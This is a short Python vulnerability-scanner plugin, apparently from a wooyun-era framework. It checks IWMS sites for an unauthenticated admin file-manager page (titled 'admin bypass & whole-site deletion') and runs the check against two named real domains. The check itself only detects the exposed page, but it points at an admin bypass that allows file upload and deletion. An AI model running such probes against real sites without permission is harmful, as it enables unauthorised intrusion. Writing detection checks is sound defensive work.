#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:IWMS系统后台绕过&整站删除
#Refer:http://www.wooyun.org/bugs/wooyun-2010-083888

def assign(service,arg):
    if service=="iwms":
        return True,arg 
    


def  audit(arg):
    url=arg+"Admin/pages/fileManager.aspx?bp="
    code,head,res,errcode,_=curl.curl2(url)
    if code==200 and "btnCreateFolder" in res and 'FileUpload1' in res:
        security_hole(url)

if __name__=="__main__":
    from dummy import *
    audit(assign('iwms','http://www.hbgsny.com/')[1])
    audit(assign('iwms','http://www.lixinzhiyao.com/')[1])